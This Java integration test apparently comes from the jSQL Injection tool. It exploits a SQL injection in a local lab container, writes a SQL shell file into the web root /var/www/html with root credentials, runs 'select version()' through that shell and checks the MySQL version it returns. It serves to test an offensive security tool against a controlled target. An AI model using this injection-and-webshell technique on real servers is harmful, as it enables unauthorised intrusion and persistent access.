package com.test.vendor.mysql;

import com.jsql.model.InjectionModel;
import com.jsql.model.exception.JSqlException;
import com.jsql.view.terminal.SystemOutTerminal;
import org.junit.jupiter.api.Assertions;
import org.junitpioneer.jupiter.RetryingTest;

import java.util.UUID;

public class MySqlSqlshellSuiteIT extends ConcreteMySqlSuiteIT {
    
    @Override
    public void setupInjection() throws Exception {
        
        InjectionModel model = new InjectionModel();
        this.injectionModel = model;

        model.subscribe(new SystemOutTerminal());

        model.getMediatorUtils().getParameterUtil().initializeQueryString("http://jsql-lamp:8079/get2.php?id=");

        model
        .getMediatorUtils()
        .getConnectionUtil()
        .withMethodInjection(model.getMediatorMethod().getQuery())
        .withTypeRequest("GET");
        
        model.beginInjection();
    }
    
    @RetryingTest(3)
    public void webshell() throws JSqlException, InterruptedException {

        this.injectionModel.getResourceAccess().createSqlShell("/var/www/html/", "", "root", "password");
        // For coverage
        this.injectionModel.getResourceAccess().createSqlShell("/var/www/html", "http://jsql-lamp:8079/fake", "root", "password");

        String resultCommand = this.injectionModel.getResourceAccess().runSqlShell(
            "select version()",
            UUID.randomUUID(),
            "http://jsql-lamp:8079/."+ this.injectionModel.getVersionJsql() +".js.php",
            "root",
            "password"
        );

        LOGGER.info("Sqlshell: found {} to find {}", resultCommand.trim(), "5.7.42-0ubuntu0.18.04.1");

        Assertions.assertTrue(resultCommand.trim().contains("5.7.42-0ubuntu0.18.04.1"));
    }
}
